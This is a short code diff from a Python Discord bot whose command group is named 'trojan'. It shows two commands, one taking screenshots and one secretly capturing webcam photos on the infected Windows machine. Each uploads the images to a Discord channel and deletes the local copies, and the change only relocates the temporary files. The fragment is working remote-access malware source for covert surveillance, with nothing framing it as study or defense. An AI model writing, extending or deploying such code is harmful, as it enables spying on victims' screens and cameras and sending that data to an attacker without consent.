@@ -340,18 +340,18 @@ async def on_ready():
 @trojan.command()
 async def screenshot(ctx, pc=pc_name):
     if pc == os.getenv("UserName"):
-        pyautogui.screenshot('c:\\WINDOWS\\Temp\\s.png')
-        await ctx.send(file=discord.File('c:\\WINDOWS\\Temp\\s.png'))
-        os.remove("c:\\WINDOWS\\Temp\\s.png")
+        pyautogui.screenshot(f'C:\\Users\\{os.getenv("username")}\\s.png')
+        await ctx.send(file=discord.File(f'C:\\Users\\{os.getenv("username")}\\s.png'))
+        os.remove(f'C:\\Users\\{os.getenv("username")}\\s.png')
 
 @trojan.command()
 async def photo(ctx, pc=pc_name):
     if pc == os.getenv("UserName"):
         camera = cv2.VideoCapture(0)
         return_value, image = camera.read()
-        cv2.imwrite(f'c:\\WINDOWS\\Temp\\f.png', image)
-        await ctx.send(file=discord.File(f'c:\\WINDOWS\\Temp\\f.png'))
-        os.remove(f'c:\\WINDOWS\\Temp\\f.png')
+        cv2.imwrite(f'C:\\Users\\{os.getenv("username")}\\f.png', image)
+        await ctx.send(file=discord.File(f'C:\\Users\\{os.getenv("username")}\\f.png'))
+        os.remove(f'C:\\Users\\{os.getenv("username")}\\f.png')
 
 # - PC Informations
 @trojan.command()
